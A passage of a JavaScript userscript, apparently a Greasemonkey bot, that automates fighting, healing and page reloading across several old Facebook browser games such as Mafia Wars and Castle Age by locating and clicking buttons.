		// if we have no fresh meat or are not in the correct page we will hit this. 
		// no fresh meat but has attack buttons: (has stamina, has attack, no fresh meat)
		// If we have a "need more stamina" message we will hit this (has stamina, no attack, no fresh meat)
		// Need to re-load fight page only for "need more stamina" messages.
		if(this.HasAttackButtons()) {
//			this.SetMessage('has attack buttons');
//			this.GMLog('has attack buttons');
			this.VisitFightPage(false);
		} else {
			this.VisitFightPage(true);
		}
		return "fightpage";
	}
	for(var s=0; s<ss.snapshotLength; s++) {
		var sObj=ss.snapshotItem(s);
		var tr=sObj;
		var button=null;
		var doOverlay=true;
		if(sObj.tagName.toUpperCase()=='IMG') {
			// castle age
			var button=sObj;
			while(button.tagName.toUpperCase()!="A") {
				button=button.parentNode;
			}
			doOverlay=false;
		} else {
			while(tr.tagName.toUpperCase()!="TR") {
				tr=tr.parentNode;
			}
			button=nHtml.FindByAttrXPath(tr,"input",
				"(@type='submit' or @class='fresh_meat_green' or @type='button') and not(contains(@value,'Invite'))");
			if(!button)
				button=nHtml.FindByAttrXPath(tr,"a","(contains(@onclick,'attack'))");
		}
		if(!button) {
			this.GMLog('No button for fresh meat');
			continue;
		}

		this.GMLog('Fight freshmeat');
		this.Click(button);

		if(doOverlay) {
			this.DoFightOverlay();
		}
		return 'fight';
	}
	return null;
},

Fight:function() {
	if(!this.stats.stamina) { return null; }
	
	this.SetFightMessage("");
	var lastFight=this.GMGetValue('LastFight','').split(',');
	if(lastFight.length>1) {
		if(this.stats.stamina.num == lastFight[0]) {
			// we have the same health as before so the fight did not work.
			var nextFight=parseInt(lastFight[1])+(1*60*1000);
			var now=(new Date().getTime());
			if(now<nextFight) {
				this.SetFightMessage("<font style='font-size: 16pt'>No stamina lost in last fight, maybe the user is dead, let's wait "+Math.floor((nextFight-now)/1000)+" secs</font>");
				// not ready for the next fight yet.
				return null;
			}
		}
	}
	var f=this.DoFight();
	if(f=='fight') {
		// we fought someone, let's record it.
		this.GMSetValue('LastFight',this.stats.stamina.num+","+(new Date().getTime()).toString());
		this.waitMilliSecs=13000;
	} else {
		this.GMSetValue('LastFight','');
	}
	return f;
},

NextFightTarget:function() {
	var fightUpto=this.GMGetValue('FightTargetUpto',0);
	this.GMSetValue('FightTargetUpto',fightUpto+1);
},
GetCurrentFightTarget:function() {
	var target=this.GetFightTarget();
	if(target=="") { return ""; }
	var targets=target.split(/[\n,]/);
	var fightUpto=this.GMGetValue('FightTargetUpto',0);
	this.GMLog('nth fight target:'+fightUpto);
	fightUpto=fightUpto%targets.length;
	return targets[fightUpto];
},
DoFight:function() {
	if(!this.stats.stamina) {
		return null;
	}
	if(!this.stats.health) {
		return null;
	}
	if(this.stats.stamina.num<=0) {
		this.SetFightMessage("Waiting for more stamina");
		return null;
	}
	if(this.stats.health.num<=20) {
		this.SetFightMessage("Need at least 20 health to fight");
		return null;
	}

	var target=this.GetCurrentFightTarget();
	if(target=="") { return null; }

	this.waitMilliSecs=13000;
	if(target!='freshmeat') {
		var f=this.FightUserId(target);
		if(f!=null) {
			this.NextFightTarget();
		}
		return f;
	}
	return this.FightFreshmeat();
},


///////////////////////////////////////////////////////
// hospital

GetMinToHospital:function() {
	var n=this.GMGetValue('MinToHospital','');
	if(n==null || n=='') { return ''; }
	return parseInt(n);
},

Hospital:function() {
	this.SetHospitalMessage("");
	var minToHospital=this.GetMinToHospital();
	if(minToHospital=="") {
		return null;
	}
	var health=this.stats.health;
	if(!health) { return null; }
	var lastHealthOnHeal=this.GMGetValue('LastHealthOnHeal',0);
	if(lastHealthOnHeal==health.num) {
		// nothing happened on 
		this.SetHospitalMessage("Health did not change after the last heal, maybe trying to heal too fast.");
		return null;
	}
	if(health.num>=health.max || health.num>minToHospital) {
		return null;
	}
	
	var content=document.getElementById('content');
	// old mafia wars
	var healLink=nHtml.FindByAttrXPath(content,"a","contains(@onclick,'controller=hospital') and contains(@onclick,'action=heal')");
	
	if(!healLink) {
		// inthemafia
		healLink=nHtml.FindByAttrXPath(content,"a","contains(@onclick,'tryHeal(')");
	}
	
	if(!healLink) {
		// heal button castle age, gangwars, dragonwars, glamour_age
		var healForm=nHtml.FindByAttrXPath(content,"form","contains(@id,'_healForm') or contains(@id,'_hospital') or contains(@action,'hospital.php')");
		if(!healForm) {
			// robhood, etc.
			healForm=nHtml.FindByAttrXPath(content,'input',"@name='op' and @value='heal'");
			if(healForm) healForm=healForm.parentNode;
		}
		
		if(!healForm) {
			// street racing
			healForm=nHtml.FindByAttrXPath(content,'input',"contains(@name,'healthRefillNowBtn')");
			if(!healForm)
				healForm=nHtml.FindByAttrXPath(content,'input',"@name='popup_action' and @value='Heal'");
			if(healForm) {
				while(healForm && healForm.tagName!="BODY") {
					if(healForm.tagName=="FORM") { break; }
					healForm=healForm.parentNode;
				}
				if(healForm.tagName!="FORM") {
					healLink=null;
				}
			}
		}
		var favor=null;
		if(healForm) favor=nHtml.FindByAttrXPath(healForm,'input',"@name='favor'");
		if(favor) {
			// don't spend favor points!
			healLink=healForm=null;
			this.GMLog("Will not heal cause we've found the wrong link.");
		} else if(healForm) {
			healLink=nHtml.FindByAttrXPath(healForm,"input","@type='button' or @type='submit' or @type='image'");
		}
	}
	if(!healLink) {
		return this.VisitHospitalPage();
	}
	this.GMLog('Heal');
	this.GMSetValue('LastHealthOnHeal',health.num);
	this.Click(healLink);
	this.waitMilliSecs=10000;
	return 'hospital';
},

VisitHospitalPage:function() {
	this.GMLog('Visit hospital');
	var content=document.getElementById('content');
	var hospitalLink=nHtml.FindByAttrXPath(content,"a","contains(@onclick,'controller=hospital') and contains(@onclick,'action=view')");
	
	var isKidsGame=this.IsKidsGame();
	if(isKidsGame) {
		hospitalLink=nHtml.FindByAttrXPath(content,"a","contains(@href,'/healer.php') or contains(@href,'/medic.php') or contains(@href,'/hospital.php')");
		if(hospitalLink) {
			this.VisitUrl(hospitalLink.href);
			return 'visithospital';
		}
		return null;
	}

	var gameName=this.GameName();
	if(gameName=="castle_age" || gameName=='glamour_age') {
		// hospital is in keep page: castle age
		hospitalLink=nHtml.FindByAttrXPath(content,"a","contains(@onclick,'keep.php')");
	}
	if(!hospitalLink) {
		// castle age
		hospitalLink=nHtml.FindByAttrXPath(content,"a","contains(@class,'heal_link')");
	}
	if(gameName=='under_world') {
		// hospital is in stats page
		hospitalLink=nHtml.FindByAttrXPath(content,"a","contains(@onclick,'stats.php')");
	}
	if(gameName=="vampiresgame") {
		var healInp=nHtml.FindByAttrXPath(content,"input","@value='Heal' and @type='hidden'");
		if(healInp) {
			var healForm=healInp.parentNode;
			hospitalLink=nHtml.FindByAttrXPath(healForm,"input","@type='submit'");
		}
	}

	if(!hospitalLink) {
		// gangwars, fashionwars, heroes and villians, piratesrule ...
		this.VisitUrl('hospital.php');
		return 'visithospital';
	}

	
//	if(gameName=="gangwarsgame" || gameName=="fashionwarsgame") {
	if(!hospitalLink) {
		this.GMLog('Cannot find hospital link');
		return null;
	}
	this.waitMilliSecs=10000;
	this.Click(hospitalLink);
	return 'visithospital';
},



///////////////////////////////////////////////////////




GetGameDisabled:function() {
	return this.GMGetValue('disabled',false);
},

GetDivAtBottom:function() {
	return this.GMGetValue('DivAtBottom',false);
},


currentPage:"",
waitMilliSecs:5000,
CheckPage:function() {

	// assorted errors...
	var href=location.href;
	if(href.indexOf('/common/error.html')>=0) {
		this.GMLog('detected error page, waiting to go back to previous page.');
		window.setTimeout(function() {
			window.history.go(-1);
		}, 30*1000);
		return;
	}

	if(document.getElementById('try_again_button')) {
		this.GMLog('detected Try Again message, waiting to reload');
		// error
		window.setTimeout(function() {
			window.history.go(0);
		}, 30*1000);
		return;
	}

	var gameDisabled=this.GetGameDisabled();
	this.SetupDivs();
	this.AddFightLinks();
	if(!gameDisabled) {
		var ok="";
		this.waitMilliSecs=fastLoad?1000:5000;
		var goJobs=this.GMGetValue('GoJobs',0);
		if(goJobs) {
			this.GMLog('go to the jobs page cause we have reloaded');
			this.VisitJobPage();
			return;
		}

		this.GetStats();
		this.SetControls();
		this.DrawProperties();
	//	if(this.currentPage.indexOf('jobs')<0 && this.Jobs(true)) {
	//		ok=this.Jobs(false);
		if((ok=this.Jobs(false))!=null) {
		} else if((ok=this.Properties())!=null) {
		} else if((ok=this.Hospital())!=null) {
		} else if((ok=this.Bank())!=null) {
		} else if((ok=this.Fight())!=null) {
		}
		//this.GMLog('ok:'+ok);
		if(ok && ok.length>0) {
			this.currentPage=ok;
		}
	} else {
		this.GetStats();
		this.SetControls();
		this.DrawJobs(null,true);
		this.DrawProperties();
	}
	
	// reload the page once an hour incase of bugs in the game, like streetracinggame.
	// Also reload if we can't find the amount of cash we have.
	var gameName=this.GameName();
	var nowTime=(new Date()).getTime();
	var forceReload=false;
	if((gameName=="streetracinggame" || this.stats.cash==undefined)
	&& (this.lastReload.getTime()+this.autoReloadMilliSecs)<nowTime) {
		this.GMLog('We are reloading the page cause something is wrong.');
		this.GMSetValue('GoJobs',1);
		forceReload=true;
	}

	if(this.IsOldGame()
	|| forceReload) {
		// doesn't auto update the status info until we hit reload.
		nHtml.setTimeout(function() { window.history.go(0); },3*60*1000);
	} else {
		this.waitForPageChange=true;
		nHtml.setTimeout(function() { this.waitForPageChange=false; Zynga.CheckPage(); },this.waitMilliSecs);
	}
}

/*
PageChange:function() {
	if(this.waitForPageChange) {
		this.waitForPageChange=false;
		// wait for all the ajax stuff to finish...
		window.setTimeout(function() { Zynga.CheckPage(); },2000);
	}
}
*/

};



if(fastLoad) {
	Zynga.CheckPage();
}

window.addEventListener("load", function(e) {
/*
	window.addEventListener("DOMNodeInserted", function(e) {
		if(e.target.id!=undefined && e.target.id.trim()!="") {
			Zynga.PageChange();
		}
	},false);
*/
	//console.profile('Zynga games');

	if(!fastLoad) {
		Zynga.CheckPage();
	}
	//console.profileEnd();
},false);


